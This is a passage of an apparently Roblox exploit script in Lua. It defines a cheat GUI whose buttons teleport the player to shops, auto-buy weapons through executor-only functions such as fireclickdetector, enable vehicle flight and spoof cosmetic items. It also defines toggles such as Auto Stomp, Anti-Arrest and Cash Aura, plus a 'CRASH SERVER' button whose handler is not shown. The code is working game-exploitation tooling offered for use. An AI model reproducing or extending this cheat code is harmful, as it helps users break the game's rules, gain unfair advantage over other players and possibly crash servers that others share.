                            fireclickdetector(cq:FindFirstChild("ClickDetector"), 4)
                        end
                    end
                    if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
                        tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
                        tool.Parent = game.Players.LocalPlayer.Character
                    end
                    game:GetService("VirtualUser"):ClickButton1(Vector2.new())
                    local z = Vector3.new(-1006.99, -51.1542, -1014.33)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(z)
                end
            end
        )
        bk.Name = "bikefly"
        bk.Parent = bb
        bk.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bk.BorderSizePixel = 0
        bk.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
        bk.Size = UDim2.new(0, 94, 0, 46)
        bk.Font = Enum.Font.GothamBlack
        bk.Text = "BikeFly"
        bk.TextColor3 = Color3.fromRGB(255, 0, 0)
        bk.TextSize = 14.000
        bk.MouseButton1Down:Connect(
            function()
                local speed = 20
                local cr
                local cs = game.Players.LocalPlayer
                local ct = {}
                local cu = {q = false, e = false, w = false, a = false, s = false, d = false}
                local ck = cs:GetMouse()
                ck.KeyDown:connect(
                    function(cv)
                        local cw = cv:lower()
                        if cu[cw] ~= nil then
                            cu[cw] = true
                        end
                    end
                )
                ck.KeyUp:connect(
                    function(cv)
                        local cw = cv:lower()
                        if cu[cw] ~= nil then
                            cu[cw] = false
                        end
                    end
                )
                while game.RunService.Stepped:wait() do
                    local cx = cs.Character or cs.CharacterAdded:wait():WaitForChild("Humanoid").SeatPart
                    if
                        cs.PlayerGui:FindFirstChild("MainScreenGui") and
                            cs.PlayerGui.MainScreenGui:FindFirstChild("Bar") and
                            cs.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed")
                     then
                        cs.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
                    else
                        local cy = cs.PlayerGui.MainScreenGui.Bar.HP
                        local cz = cy:Clone()
                        cz.Name = "Speed"
                        cz.Position = UDim2.new(0.5, 0, 1, -120)
                        cz.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
                        cz.Picture.Image.Image = "rbxassetid://181035717"
                        cz.TextLabel.Text = "Speed"
                        cz.Parent = cy.Parent
                    end
                    if cx ~= nil and cx:IsDescendantOf(game.Workspace.Vehicles) then
                        if cx ~= cr then
                            if cr then
                                cr.Vel:Destroy()
                                cr.Gyro:Destroy()
                            end
                            cr = cx
                            for s = 1, 2 do
                                if ct[s] then
                                    ct[s][2].Parent = ct[s][1]
                                end
                                local cA = cx.Parent.Wheel
                                ct[s] = {cx.Parent, cA}
                                cA:remove()
                            end
                            local cB = Instance.new("BodyGyro", cx)
                            cB.Name = "Gyro"
                            local pos = Instance.new("BodyVelocity", cx)
                            pos.Name = "Vel"
                            cB.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                            pos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        else
                            cx.Gyro.cframe = workspace.CurrentCamera.CoordinateFrame
                            local cC = CFrame.new(0, 0, 0)
                            if cu.w then
                                cC = cC * CFrame.new(0, 0, -speed)
                            end
                            if cu.s then
                                cC = cC * CFrame.new(0, 0, speed)
                            end
                            if cu.a then
                                cC = cC * CFrame.new(-speed, 0, 0)
                            end
                            if cu.d then
                                cC = cC * CFrame.new(speed, 0, 0)
                            end
                            cx.Vel.Velocity = (cx.CFrame * cC).p - cx.CFrame.p
                        end
                    end
                    if cu.e and speed < 100 then
                        speed = speed + 1
                    end
                    if cu.q and speed > 0 then
                        speed = speed - 1
                    end
                end
            end
        )
        bl.Name = "ppbat"
        bl.Parent = bb
        bl.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bl.BorderSizePixel = 0
        bl.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
        bl.Size = UDim2.new(0, 94, 0, 46)
        bl.Font = Enum.Font.GothamBlack
        bl.Text = "PPbat"
        bl.TextColor3 = Color3.fromRGB(255, 0, 0)
        bl.TextSize = 14.000
        bl.MouseButton1Down:Connect(
            function()
                local z = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                local cq = game.Workspace.Ignored.Shop["[Bat] - $250"]
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cq.Head.CFrame + Vector3.new(0, 3, 0)
                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - cq.Head.Position).Magnitude <= 50 then
                    wait(.2)
                    fireclickdetector(cq:FindFirstChild("ClickDetector"), 4)
                    toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
                    toolf.Parent = game.Players.LocalPlayer.Character
                    wait()
                    game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
                    game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip =
                        CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
                    game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
                    game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos =
                        Vector3.new(1.2111, 1.11114, 1.8111)
                    game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(z)
                end
            end
        )
        bm.Name = "FOV"
        bm.Parent = bb
        bm.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bm.BorderSizePixel = 0
        bm.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
        bm.Size = UDim2.new(0, 94, 0, 46)
        bm.Font = Enum.Font.GothamBlack
        bm.Text = "Holy Cross"
        bm.TextColor3 = Color3.fromRGB(255, 0, 0)
        bm.TextSize = 14.000
        bm.MouseButton1Down:Connect(
            function()
                pcall(
                    function()
                        for s, O in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if O.Name == "[SledgeHammer]" then
                                O.Parent = game.Players.LocalPlayer.Character
                            end
                        end
                    end
                )
                wait(.9)
                local cD = CFrame.new(-899.925659, 21.75, -297.100342)
                local Q = game.Players.LocalPlayer
                local pos = Q.Character.HumanoidRootPart.Position
                if not game.Players.LocalPlayer.Character:FindFirstChild("[SledgeHammer]") then
                    Q.Character.HumanoidRootPart.CFrame = cD
                    local cE =
                        game:GetService("Workspace").Ignored.Shop["[SledgeHammer] - $350"]:FindFirstChild(
                        "ClickDetector"
                    )
                    wait(.9)
                    fireclickdetector(cE)
                    wait(.4)
                    game.Players.LocalPlayer.Backpack:FindFirstChild("[SledgeHammer]").Parent = Q.Character
                    wait(.9)
                    fireclickdetector(cE)
                    wait(.4)
                    game.Players.LocalPlayer.Backpack:FindFirstChild("[SledgeHammer]").Parent = Q.Character
                    for s, O in pairs(Q.Character:GetChildren()) do
                        if O.Name == "[SledgeHammer]" then
                            O:GetChildren()[3]:Destroy()
                        end
                    end
                    local cF = Q.Character:FindFirstChild("[SledgeHammer]")
                    cF.Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
                    cF.GripForward = Vector3.new(0, 0, -1)
                    cF.GripPos = Vector3.new(-2.4, -0.7, 0)
                    cF.GripUp = Vector3.new(1, 0, 0)
                    Q.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                end
                local cF = Q.Character:FindFirstChild("[SledgeHammer]")
                cF.Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
                cF.GripForward = Vector3.new(0, 0, -1)
                cF.GripPos = Vector3.new(-2.4, -0.7, 0)
                cF.GripUp = Vector3.new(1, 0, 0)
                Q.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
            end
        )
        bn.Name = "Naked"
        bn.Parent = bb
        bn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bn.BorderSizePixel = 0
        bn.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
        bn.Size = UDim2.new(0, 94, 0, 46)
        bn.Font = Enum.Font.GothamBlack
        bn.Text = "FE Naked"
        bn.TextColor3 = Color3.fromRGB(255, 0, 0)
        bn.TextSize = 14.000
        bn.MouseButton1Down:Connect(
            function()
                pcall(
                    function()
                        if game.Players.LocalPlayer.Character:FindFirstChild("Shirt") then
                            game.Players.LocalPlayer.Character.Shirt:Destroy()
                        elseif game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
                            game.Players.LocalPlayer.Character.Pants:Destroy()
                        end
                    end
                )
            end
        )
        bo.Name = "Juggernaut"
        bo.Parent = bb
        bo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bo.BorderSizePixel = 0
        bo.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
        bo.Size = UDim2.new(0, 94, 0, 46)
        bo.Font = Enum.Font.GothamBlack
        bo.Text = "Juggernaut"
        bo.TextColor3 = Color3.fromRGB(255, 0, 0)
        bo.TextSize = 14.000
        bo.MouseButton1Down:Connect(
            function()
                local cG = game:GetService("Players").LocalPlayer
                local ck = cG:GetMouse()
                local cH = 0
                local cI = Instance.new("Animation")
                cI.AnimationId = "rbxassetid://2788838708"
                function StopAudio()
                    cG.Character.LowerTorso.BOOMBOXSOUND:Stop()
                end
                function stop(cJ, cm)
                    local cK =
                        coroutine.wrap(
                        function()
                            wait(cG.Character.LowerTorso.BOOMBOXSOUND.TimeLength - 0.1)
                            if cG.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://" .. cJ and cH == cm then
                                StopAudio()
                            end
                        end
                    )
                    cK()
                end
                function play(cJ, cL, cM)
                    if cG.Backpack:FindFirstChild("[Boombox]") then
                        local Tool = nil
                        if cG.Character:FindFirstChildOfClass("Tool") and cM == true then
                            Tool = cG.Character:FindFirstChildOfClass("Tool")
                            cG.Character:FindFirstChildOfClass("Tool").Parent = cG.Backpack
                        end
                        cG.Backpack["[Boombox]"].Parent = cG.Character
                        game.ReplicatedStorage.MainEvent:FireServer("Boombox", cJ)
                        cG.Character["[Boombox]"].RequiresHandle = false
                        if cG.Character["[Boombox]"]:FindFirstChild("Handle") then
                            cG.Character["[Boombox]"].Handle:Destroy()
                        end
                        cG.Character["[Boombox]"].Parent = cG.Backpack
                        cG.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
                        if Tool ~= true then
                            if Tool then
                                Tool.Parent = cG.Character
                            end
                        end
                        if cL == true then
                            cG.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                            local cK =
                                coroutine.wrap(
                                function()
                                    repeat
                                        wait()
                                    until cG.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://" .. cJ and
                                        cG.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                                    cH = cH + 1
                                    stop(cJ, cH)
                                end
                            )
                            cK()
                        end
                    end
                end
                function Tool()
                    local Tool = Instance.new("Tool")
                    Tool.Name = "Juggernaut"
                    Tool.RequiresHandle = false
                    Tool.Activated:Connect(
                        function()
                            local cN = cG.Character
                            local cO = cN:FindFirstChildOfClass("Humanoid")
                            function rm()
                                for s, O in pairs(cN:GetDescendants()) do
                                    if O:IsA("BasePart") or O:IsA("MeshPart") then
                                        if O.Name ~= "Head" then
                                            for s, cP in pairs(O:GetDescendants()) do
                                                if cP:IsA("Attachment") then
                                                    if cP:FindFirstChild("OriginalPosition") then
                                                        cP.OriginalPosition:Destroy()
                                                    end
                                                end
                                            end
                                            for s, O in pairs(O:GetChildren()) do
                                                if O.Name == "OriginalSize" then
                                                    O:Destroy()
                                                end
                                            end
                                            if O:FindFirstChild("AvatarPartScaleType") then
                                                O:FindFirstChild("AvatarPartScaleType"):Destroy()
                                            end
                                        end
                                    end
                                end
                            end
                            cO:LoadAnimation(cI):Play()
                            play(862491729, true, true)
                            wait(0.4)
                            rm()
                            cO:FindFirstChild("BodyTypeScale"):Destroy()
                            wait(0.2)
                            rm()
                            cO:FindFirstChild("BodyWidthScale"):Destroy()
                            wait(0.02)
                            rm()
                            cO:FindFirstChild("BodyDepthScale"):Destroy()
                            wait(0.02)
                            rm()
                            cO:FindFirstChild("BodyTypeScale"):Destroy()
                            wait(0.02)
                        end
                    )
                    Tool.Parent = cG.Backpack
                end
                Tool()
            end
        )
        bp.Name = "korblox1"
        bp.Parent = bb
        bp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bp.BorderSizePixel = 0
        bp.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
        bp.Size = UDim2.new(0, 94, 0, 46)
        bp.Font = Enum.Font.GothamBlack
        bp.Text = "FE Korblox"
        bp.TextColor3 = Color3.fromRGB(255, 0, 0)
        bp.TextSize = 14.000
        bp.MouseButton1Down:Connect(
            function()
                local cQ = game.Players.LocalPlayer
                local cR = cQ.Character
                cR.RightLowerLeg.MeshId = "902942093"
                cR.RightLowerLeg.Transparency = "1"
                cR.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
                cR.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
                cR.RightFoot.MeshId = "902942089"
                cR.RightFoot.Transparency = "1"
            end
        )
        bq.Name = "headless1"
        bq.Parent = bb
        bq.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bq.BorderSizePixel = 0
        bq.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
        bq.Size = UDim2.new(0, 94, 0, 46)
        bq.Font = Enum.Font.GothamBlack
        bq.Text = "FE Headless"
        bq.TextColor3 = Color3.fromRGB(255, 0, 0)
        bq.TextSize = 14.000
        bq.MouseButton1Down:Connect(
            function()
                game.Players.LocalPlayer.Character.Head.Transparency = 1
                game.Players.LocalPlayer.Character.Head.Transparency = 1
                for s, O in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
                    if O:IsA("Decal") then
                        O.Transparency = 1
                    end
                end
            end
        )
        br.Name = "TogglesFrame"
        br.Parent = ap
        br.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        br.BackgroundTransparency = 1.000
        br.Size = UDim2.new(0, 316, 0, 325)
        br.Visible = false
        bs.Name = "QToTp"
        bs.Parent = br
        bs.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bs.BorderSizePixel = 0
        bs.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
        bs.Size = UDim2.new(0, 94, 0, 46)
        bs.Font = Enum.Font.GothamBlack
        bs.Text = "Q to TP"
        bs.TextColor3 = Color3.fromRGB(255, 0, 0)
        bs.TextSize = 14.000
        bt.Name = "QToTpColor"
        bt.Parent = bs
        bt.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bt.BorderSizePixel = 0
        bt.Size = UDim2.new(0, 93, 0, 5)
        bt.Font = Enum.Font.SourceSans
        bt.Text = ""
        bt.TextColor3 = Color3.fromRGB(255, 0, 0)
        bt.TextSize = 14.000
        bu.Name = "HideBlock"
        bu.Parent = br
        bu.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bu.BorderSizePixel = 0
        bu.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
        bu.Size = UDim2.new(0, 94, 0, 46)
        bu.Font = Enum.Font.GothamBlack
        bu.Text = "Hide Block"
        bu.TextColor3 = Color3.fromRGB(255, 0, 0)
        bu.TextSize = 14.000
        bv.Name = "HideBlockColor"
        bv.Parent = bu
        bv.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bv.BorderSizePixel = 0
        bv.Size = UDim2.new(0, 93, 0, 5)
        bv.Font = Enum.Font.SourceSans
        bv.Text = ""
        bv.TextColor3 = Color3.fromRGB(255, 0, 0)
        bv.TextSize = 14.000
        bw.Name = "HideUser"
        bw.Parent = br
        bw.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bw.BorderSizePixel = 0
        bw.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
        bw.Size = UDim2.new(0, 94, 0, 46)
        bw.Font = Enum.Font.GothamBlack
        bw.Text = "Hide User"
        bw.TextColor3 = Color3.fromRGB(255, 0, 0)
        bw.TextSize = 14.000
        bx.Name = "HideUserColor"
        bx.Parent = bw
        bx.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bx.BorderSizePixel = 0
        bx.Size = UDim2.new(0, 93, 0, 5)
        bx.Font = Enum.Font.SourceSans
        bx.Text = ""
        bx.TextColor3 = Color3.fromRGB(255, 0, 0)
        bx.TextSize = 14.000
        by.Name = "AutoStomp"
        by.Parent = br
        by.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        by.BorderSizePixel = 0
        by.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
        by.Size = UDim2.new(0, 94, 0, 46)
        by.Font = Enum.Font.GothamBlack
        by.Text = "Auto Stomp"
        by.TextColor3 = Color3.fromRGB(255, 0, 0)
        by.TextSize = 14.000
        bz.Name = "AutoStompColor"
        bz.Parent = by
        bz.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bz.BorderSizePixel = 0
        bz.Size = UDim2.new(0, 93, 0, 5)
        bz.Font = Enum.Font.SourceSans
        bz.Text = ""
        bz.TextColor3 = Color3.fromRGB(255, 0, 0)
        bz.TextSize = 14.000
        bA.Name = "RocketRide"
        bA.Parent = br
        bA.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bA.BorderSizePixel = 0
        bA.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
        bA.Size = UDim2.new(0, 94, 0, 46)
        bA.Font = Enum.Font.GothamBlack
        bA.Text = "Rocket Ride"
        bA.TextColor3 = Color3.fromRGB(255, 0, 0)
        bA.TextSize = 14.000
        bB.Name = "RocketRideColor"
        bB.Parent = bA
        bB.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bB.BorderSizePixel = 0
        bB.Size = UDim2.new(0, 93, 0, 5)
        bB.Font = Enum.Font.SourceSans
        bB.Text = ""
        bB.TextColor3 = Color3.fromRGB(255, 0, 0)
        bB.TextSize = 14.000
        bC.Name = "AntiArrest"
        bC.Parent = br
        bC.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bC.BorderSizePixel = 0
        bC.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
        bC.Size = UDim2.new(0, 94, 0, 46)
        bC.Font = Enum.Font.GothamBlack
        bC.Text = "Anti-Arrest"
        bC.TextColor3 = Color3.fromRGB(255, 0, 0)
        bC.TextSize = 14.000
        bD.Name = "AntiArrestColor"
        bD.Parent = bC
        bD.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bD.BorderSizePixel = 0
        bD.Size = UDim2.new(0, 93, 0, 5)
        bD.Font = Enum.Font.SourceSans
        bD.Text = ""
        bD.TextColor3 = Color3.fromRGB(255, 0, 0)
        bD.TextSize = 14.000
        bE.Name = "AntiGrab"
        bE.Parent = br
        bE.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bE.BorderSizePixel = 0
        bE.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
        bE.Size = UDim2.new(0, 94, 0, 46)
        bE.Font = Enum.Font.GothamBlack
        bE.Text = "Anti-RPG"
        bE.TextColor3 = Color3.fromRGB(255, 0, 0)
        bE.TextSize = 14.000
        bF.Name = "AntiGrabColor"
        bF.Parent = bE
        bF.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bF.BorderSizePixel = 0
        bF.Size = UDim2.new(0, 93, 0, 5)
        bF.Font = Enum.Font.SourceSans
        bF.Text = ""
        bF.TextColor3 = Color3.fromRGB(255, 0, 0)
        bF.TextSize = 14.000
        bG.Name = "AutoDrop"
        bG.Parent = br
        bG.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bG.BorderSizePixel = 0
        bG.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
        bG.Size = UDim2.new(0, 94, 0, 46)
        bG.Font = Enum.Font.GothamBlack
        bG.Text = "Auto Armor"
        bG.TextColor3 = Color3.fromRGB(255, 0, 0)
        bG.TextSize = 14.000
        bH.Name = "AutoDropColor"
        bH.Parent = bG
        bH.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bH.BorderSizePixel = 0
        bH.Size = UDim2.new(0, 93, 0, 5)
        bH.Font = Enum.Font.SourceSans
        bH.Text = ""
        bH.TextColor3 = Color3.fromRGB(255, 0, 0)
        bH.TextSize = 14.000
        bI.Name = "AntiStomp"
        bI.Parent = br
        bI.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bI.BorderSizePixel = 0
        bI.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
        bI.Size = UDim2.new(0, 94, 0, 46)
        bI.Font = Enum.Font.GothamBlack
        bI.Text = "Anti-Stomp"
        bI.TextColor3 = Color3.fromRGB(255, 0, 0)
        bI.TextSize = 14.000
        bJ.Name = "AntiStompColor"
        bJ.Parent = bI
        bJ.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bJ.BorderSizePixel = 0
        bJ.Size = UDim2.new(0, 93, 0, 5)
        bJ.Font = Enum.Font.SourceSans
        bJ.Text = ""
        bJ.TextColor3 = Color3.fromRGB(255, 0, 0)
        bJ.TextSize = 14.000
        bK.Name = "AutoBlock"
        bK.Parent = br
        bK.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bK.BorderSizePixel = 0
        bK.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
        bK.Size = UDim2.new(0, 94, 0, 46)
        bK.Font = Enum.Font.GothamBlack
        bK.Text = "Auto Block"
        bK.TextColor3 = Color3.fromRGB(255, 0, 0)
        bK.TextSize = 14.000
        bL.Name = "AutoBlockColor"
        bL.Parent = bK
        bL.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bL.BorderSizePixel = 0
        bL.Size = UDim2.new(0, 93, 0, 5)
        bL.Font = Enum.Font.SourceSans
        bL.Text = ""
        bL.TextColor3 = Color3.fromRGB(255, 0, 0)
        bL.TextSize = 14.000
        bM.Name = "CashAura"
        bM.Parent = br
        bM.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bM.BorderSizePixel = 0
        bM.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
        bM.Size = UDim2.new(0, 94, 0, 46)
        bM.Font = Enum.Font.GothamBlack
        bM.Text = "Cash Aura"
        bM.TextColor3 = Color3.fromRGB(255, 0, 0)
        bM.TextSize = 14.000
        bN.Name = "CashAuraColor"
        bN.Parent = bM
        bN.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bN.BorderSizePixel = 0
        bN.Size = UDim2.new(0, 93, 0, 5)
        bN.Font = Enum.Font.SourceSans
        bN.Text = ""
        bN.TextColor3 = Color3.fromRGB(255, 0, 0)
        bN.TextSize = 14.000
        bO.Name = "AntiEffects"
        bO.Parent = br
        bO.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bO.BorderSizePixel = 0
        bO.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
        bO.Size = UDim2.new(0, 94, 0, 46)
        bO.Font = Enum.Font.GothamBlack
        bO.Text = "Anti-Effects"
        bO.TextColor3 = Color3.fromRGB(255, 0, 0)
        bO.TextSize = 14.000
        bP.Name = "AntiEffectsColor"
        bP.Parent = bO
        bP.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bP.BorderSizePixel = 0
        bP.Size = UDim2.new(0, 93, 0, 5)
        bP.Font = Enum.Font.SourceSans
        bP.Text = ""
        bP.TextColor3 = Color3.fromRGB(255, 0, 0)
        bP.TextSize = 14.000
        bQ.Name = "AltArmor"
        bQ.Parent = br
        bQ.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bQ.BorderSizePixel = 0
        bQ.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
        bQ.Size = UDim2.new(0, 94, 0, 46)
        bQ.Font = Enum.Font.GothamBlack
        bQ.Text = "Auto Food"
        bQ.TextColor3 = Color3.fromRGB(255, 0, 0)
        bQ.TextSize = 14.000
        bR.Name = "AltArmorColor"
        bR.Parent = bQ
        bR.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bR.BorderSizePixel = 0
        bR.Size = UDim2.new(0, 93, 0, 5)
        bR.Font = Enum.Font.SourceSans
        bR.Text = ""
        bR.TextColor3 = Color3.fromRGB(255, 0, 0)
        bR.TextSize = 14.000
        bS.Name = "AntiBag"
        bS.Parent = br
        bS.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bS.BorderSizePixel = 0
        bS.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
        bS.Size = UDim2.new(0, 94, 0, 46)
        bS.Font = Enum.Font.GothamBlack
        bS.Text = "Anti-Bag"
        bS.TextColor3 = Color3.fromRGB(255, 0, 0)
        bS.TextSize = 14.000
        bT.Name = "AntiBagColor"
        bT.Parent = bS
        bT.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bT.BorderSizePixel = 0
        bT.Size = UDim2.new(0, 93, 0, 5)
        bT.Font = Enum.Font.SourceSans
        bT.Text = ""
        bT.TextColor3 = Color3.fromRGB(255, 0, 0)
        bT.TextSize = 14.000
        bU.Name = "AntiSlow"
        bU.Parent = br
        bU.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bU.BorderSizePixel = 0
        bU.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
        bU.Size = UDim2.new(0, 94, 0, 46)
        bU.Font = Enum.Font.GothamBlack
        bU.Text = "Anti-Slow"
        bU.TextColor3 = Color3.fromRGB(255, 0, 0)
        bU.TextSize = 14.000
        bV.Name = "AntiSlowColor"
        bV.Parent = bU
        bV.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bV.BorderSizePixel = 0
        bV.Size = UDim2.new(0, 93, 0, 5)
        bV.Font = Enum.Font.SourceSans
        bV.Text = ""
        bV.TextColor3 = Color3.fromRGB(255, 0, 0)
        bV.TextSize = 14.000
        bW.Name = "SellingFrame"
        bW.Parent = ap
        bW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        bW.BackgroundTransparency = 1.000
        bW.Size = UDim2.new(0, 316, 0, 325)
        bW.Visible = false
        bX.Name = "CashTextbox"
        bX.Parent = bW
        bX.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bX.BorderSizePixel = 0
        bX.Position = UDim2.new(0.0949367061, 0, 0.212307692, 0)
        bX.Size = UDim2.new(0, 257, 0, 34)
        bX.Font = Enum.Font.SourceSans
        bX.PlaceholderText = "INSERT MONEY AMOUNT"
        bX.Text = ""
        bX.TextColor3 = Color3.fromRGB(255, 0, 0)
        bX.TextSize = 14.000
        bY.Name = "CashDropperTitle"
        bY.Parent = bW
        bY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        bY.BackgroundTransparency = 1.000
        bY.Position = UDim2.new(0.158227861, 0, 0.0276923068, 0)
        bY.Size = UDim2.new(0, 217, 0, 26)
        bY.Font = Enum.Font.LuckiestGuy
        bY.Text = "CASH DROPPER"
        bY.TextColor3 = Color3.fromRGB(255, 0, 0)
        bY.TextSize = 30.000
        bZ.Name = "CalculateButton"
        bZ.Parent = bW
        bZ.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bZ.BorderSizePixel = 0
        bZ.Position = UDim2.new(0.0949367136, 0, 0.369230747, 0)
        bZ.Size = UDim2.new(0, 118, 0, 27)
        bZ.Font = Enum.Font.GothamBlack
        bZ.Text = "Calculate"
        bZ.TextColor3 = Color3.fromRGB(255, 0, 0)
        bZ.TextSize = 14.000
        b_.Name = "DropToggleButton"
        b_.Parent = bW
        b_.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b_.BorderSizePixel = 0
        b_.Position = UDim2.new(0.532544494, 0, 0.369230747, 0)
        b_.Size = UDim2.new(0, 118, 0, 27)
        b_.Font = Enum.Font.GothamBlack
        b_.Text = "Enable"
        b_.TextColor3 = Color3.fromRGB(255, 0, 0)
        b_.TextSize = 14.000
        c0.Name = "CashDroppedLabel"
        c0.Parent = bW
        c0.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        c0.BackgroundTransparency = 1.000
        c0.Position = UDim2.new(0.0949367136, 0, 0.596923113, 0)
        c0.Size = UDim2.new(0, 200, 0, 12)
        c0.Font = Enum.Font.GothamBlack
        c0.Text = "Cash Dropped:"
        c0.TextColor3 = Color3.fromRGB(255, 0, 0)
        c0.TextSize = 14.000
        c0.TextXAlignment = Enum.TextXAlignment.Left
        c1.Name = "CashAtEndLabel"
        c1.Parent = bW
        c1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        c1.BackgroundTransparency = 0
        c1.Position = UDim2.new(0.0949367136, 0, 0.698461592, 0)
        c1.Size = UDim2.new(0, 200, 0, 12)
        c1.Font = Enum.Font.GothamBlack
        c1.Text = "Cash you will have left:"
        c1.TextColor3 = Color3.fromRGB(255, 0, 0)
        c1.TextSize = 14.000
        c1.TextXAlignment = Enum.TextXAlignment.Left
        c2.CornerRadius = UDim.new(0, 10)
        c2.Parent = c1
        c3.Parent = bW
        c3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        c3.BorderSizePixel = 0
        c3.Position = UDim2.new(0.0949367061, 0, 0.769230783, 0)
        c3.Size = UDim2.new(0, 152, 0, 4)
        c4.Name = "CrashServerButton"
        c4.Parent = bW
        c4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        c4.BorderSizePixel = 0
        c4.Position = UDim2.new(0.0949367061, 0, 0.815384626, 0)
        c4.Size = UDim2.new(0, 138, 0, 29)
        c4.Font = Enum.Font.GothamBlack
        c4.Text = "CRASH SERVER"
        c4.TextColor3 = Color3.fromRGB(255, 0, 0)
        c4.TextSize = 14.000
        Y.Active = true
        Y.Draggable = true
        function hideframes()
            aq.Visible = false
            aG.Visible = false
            aW.Visible = false
            br.Visible = false
            bW.Visible = false
